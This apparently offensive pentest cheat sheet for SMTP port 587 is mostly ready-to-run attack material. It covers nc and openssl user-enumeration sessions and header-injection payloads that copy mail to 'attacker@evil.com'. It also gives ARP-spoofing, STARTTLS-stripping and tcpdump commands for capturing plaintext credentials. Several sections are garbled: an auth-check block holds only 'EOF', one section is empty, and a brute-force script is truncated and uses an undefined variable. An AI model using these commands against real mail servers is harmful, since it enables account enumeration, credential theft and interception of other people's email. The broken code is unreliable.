## Overview

Port **587** is the designated **Mail Submission Agent (MSA)** port defined in RFC 6409. Unlike port 25 (relay/transfer), port 587 is specifically designed for authenticated email submission from mail clients (MUA) to mail servers. It typically requires **STARTTLS** encryption and **authentication** before allowing message submission.

::note
Despite requiring authentication, port 587 remains a high-value target due to credential brute-forcing, user enumeration, misconfigurations allowing open relay, and abuse for phishing campaigns.
::

| Detail           | Value                                                |
| ---------------- | ---------------------------------------------------- |
| **Port**         | 587                                                  |
| **Protocol**     | TCP                                                  |
| **Service**      | SMTP Submission (MSA)                                |
| **RFC**          | RFC 6409 (Submission), RFC 5321 (SMTP)               |
| **Encryption**   | STARTTLS (upgrades plaintext to TLS)                 |
| **Auth**         | Required (PLAIN, LOGIN, CRAM-MD5, XOAUTH2)          |
| **Common Software** | Postfix, Exim, Sendmail, Microsoft Exchange, Dovecot, hMailServer, Zimbra |

::tip
Port 587 vs other SMTP ports:
- **25** — Server-to-server relay (MTA)
- **465** — SMTPS (implicit TLS, deprecated then revived in RFC 8314)
- **587** — Client-to-server submission (STARTTLS + Auth)
::

## User Enumeration

### VRFY Command

The `VRFY` command asks the server to verify if a user/mailbox exists.

```bash [Manual VRFY]
nc -nv <TARGET_IP> 587 <<EOF
EHLO attacker.com
VRFY admin
VRFY root
VRFY postmaster
VRFY test
VRFY administrator
QUIT
EOF
```

```bash [VRFY via STARTTLS]
openssl s_client -starttls smtp -connect <TARGET_IP>:587 -quiet <<EOF
EHLO attacker.com
VRFY admin@target.com
VRFY root@target.com
VRFY info@target.com
QUIT
EOF
```

::note
Response codes for VRFY:
- **252** or **250** — User exists
- **550** — User does not exist
- **502** — VRFY command disabled
- **252** — Cannot verify but will attempt delivery (ambiguous)
::

### RCPT TO Enumeration

When `VRFY` is disabled, use `RCPT TO` to enumerate valid recipients.

```bash [RCPT TO Enumeration]
openssl s_client -starttls smtp -connect <TARGET_IP>:587 -quiet <<EOF
EHLO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<admin@target.com>
RCPT TO:<root@target.com>
RCPT TO:<info@target.com>
RCPT TO:<hr@target.com>
RCPT TO:<support@target.com>
RCPT TO:<sales@target.com>
RCPT TO:<dev@target.com>
RCPT TO:<it@target.com>
RCPT TO:<nonexistent12345@target.com>
QUIT
EOF
```

::note
Response codes for RCPT TO:
- **250** — Recipient accepted (user exists)
- **550** — User unknown / mailbox not found
- **551** — User not local
- **553** — Mailbox name invalid
- **452** — Insufficient storage
::

### Identify Auth Mechanisms

```bash [Check AUTH Methods]

EOF
```

Look for the `250-AUTH` line in the response:

### Manual Authentication

#### AUTH LOGIN


```python [smtp_brute.py]
import sys

target = sys.argv[1]
user = sys.argv[2]

with open(wordlist, 'r', errors='ignore') as f:
```

## SMTP Header Injection

### Concept

SMTP header injection occurs when user input is included in email headers without proper sanitization, allowing injection of additional headers or modification of the message.

### Injection Payloads

```text [CC Injection via Subject]
Subject: Test\r\nCc: attacker@evil.com
```

```text [BCC Injection]
From: user@target.com\r\nBcc: attacker@evil.com
```

```text [Additional Recipient via RCPT TO]
RCPT TO:<victim@target.com>\r\nRCPT TO:<attacker@evil.com>
```

```text [Body Injection via Header]
Subject: Test\r\n\r\nInjected body content here
```

```text [Reply-To Injection]
From: legit@target.com\r\nReply-To: attacker@evil.com
```

### Testing Header Injection

```bash [swaks Header Injection Test]
swaks --to victim@target.com \
  --from "test@target.com" \
  --server <TARGET_IP> --port 587 --tls \
  --auth-user user@target.com \
  --auth-password "password" \
  --header "Subject: Test\r\nBcc: attacker@evil.com" \
  --body "Header injection test"
```

## STARTTLS Stripping (MITM)

### Concept

If STARTTLS is optional (not enforced), an attacker performing MITM can strip the STARTTLS capability from the EHLO response, forcing the client to send credentials in plaintext.

```bash [ARP Spoof]
arpspoof -i eth0 -t <CLIENT_IP> <GATEWAY_IP>
arpspoof -i eth0 -t <GATEWAY_IP> <CLIENT_IP>
```

```bash [Capture SMTP Credentials]
tcpdump -i eth0 -A tcp port 587 | grep -iE "AUTH|LOGIN|PLAIN|user|pass"
```

```bash [Ettercap STARTTLS Strip]
ettercap -T -q -i eth0 -M arp:remote /<CLIENT_IP>// /<TARGET_IP>//
```

```bash [mitmproxy for SMTP]
mitmproxy --mode transparent --ssl-insecure -p 587
```
